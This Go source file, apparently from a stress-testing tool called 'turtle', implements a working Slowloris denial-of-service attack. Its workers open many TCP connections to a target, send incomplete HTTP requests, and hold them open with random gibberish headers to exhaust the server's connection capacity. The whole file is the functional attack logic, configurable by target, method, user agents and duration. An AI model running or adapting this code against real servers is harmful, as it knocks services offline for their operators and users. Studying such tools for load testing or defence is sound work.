package turtle

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"time"
)

// Slowloris provides the configurations for running slowloris attack.
type Slowloris struct {
	Target *Target `embed:""`

	// Method - the HTTP method to use. Defaults to GET
	Method string `name:"http-method" help:"the HTTP method to use. Defaults to GET"`

	// UserAgents - list of user agents to use.
	// If more than one is provided, a random one will be selected.
	// If none is provided, a default one will be used.
	UserAgents []string `name:"http-user-agent" help:"list of user agents to use. If more than one is provided, a random one will be selected. If none is provided, a default one will be used."`

	// SendGibberish - whether to send gibberish data in the request header.
	SendGibberish bool `name:"http-send-gibberish" help:"whether to send gibberish data in the request header"`

	// dial - for unit test
	dial func(network, address string) (net.Conn, error)

	// rander - for unit test
	randn randn
}

func (s *Slowloris) defaults() error {
	if err := s.Target.defaults(); err != nil {
		return err
	}
	if s.Method == "" {
		s.Method = http.MethodGet
	}
	if len(s.UserAgents) < 1 {
		s.UserAgents = defaultUserAgents[:]
	}
	if s.dial == nil {
		s.dial = net.Dial
	}
	if s.randn == nil {
		s.randn = defaultRandn()
	}

	return nil
}

func (s *Slowloris) Run(ctx context.Context) error {
	if err := s.defaults(); err != nil {
		return err
	}

	workerCtx, cancelWorker := context.WithTimeout(ctx, s.Target.Duration)
	defer cancelWorker()

	runWithWorker(
		workerCtx,
		s.Target.Connections,
		func(ctx context.Context) {
			// TODO: log error
			_ = s.worker(ctx)
		},
	)

	return nil
}

func (s *Slowloris) setupTCPConnIfNeeded(conn net.Conn) error {
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return nil
	}

	if err := tcpConn.SetLinger(0); err != nil {
		// tell the OS to close the connection immediately
		return fmt.Errorf("set linger: %w", err)
	}

	return nil
}

func (s *Slowloris) initAttack(conn net.Conn) error {
	startLine := fmt.Sprintf("%s %s HTTP/1.1", s.Method, s.Target.Url.Path)
	if err := writeHTTPLineTo(conn, startLine); err != nil {
		_ = conn.Close()
		return fmt.Errorf("write HTTP start line: %w", err)
	}

	if err := writeHTTPHeaderTo(conn, "User-Agent", s.UserAgents[s.randn(len(s.UserAgents))]); err != nil {
		_ = conn.Close()
		return fmt.Errorf("write HTTP header: %w", err)
	}

	return nil
}

func (s *Slowloris) worker(ctx context.Context) error {
	conn, err := s.dial("tcp", s.Target.Url.Host)
	if err != nil {
		return fmt.Errorf("dial %q: %w", s.Target.Url.Host, err)
	}
	defer func() {
		_ = conn.Close()
	}()

	if err := s.setupTCPConnIfNeeded(conn); err != nil {
		return fmt.Errorf("setup tcp conn: %w", err)
	}

	if err := s.initAttack(conn); err != nil {
		return fmt.Errorf("init attack: %w", err)
	}

	var gibberishTimer *time.Timer
	setGibberishTimer := func() <-chan time.Time {
		if !s.SendGibberish {
			return nil
		}

		nextInterval := time.Duration(s.randn(30_000)) * time.Millisecond
		if gibberishTimer != nil {
			gibberishTimer.Reset(nextInterval)
		} else {
			gibberishTimer = time.NewTimer(nextInterval)
		}

		return gibberishTimer.C
	}
	defer func() {
		if gibberishTimer != nil {
			gibberishTimer.Stop()
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <- setGibberishTimer():
			k, v := gibberishValue(s.randn, 5), gibberishValue(s.randn, 5)
			if err := writeHTTPHeaderTo(conn, k, v); err != nil {
				return fmt.Errorf("write gibberish HTTP header: %w", err)
			}
		}
	}
}
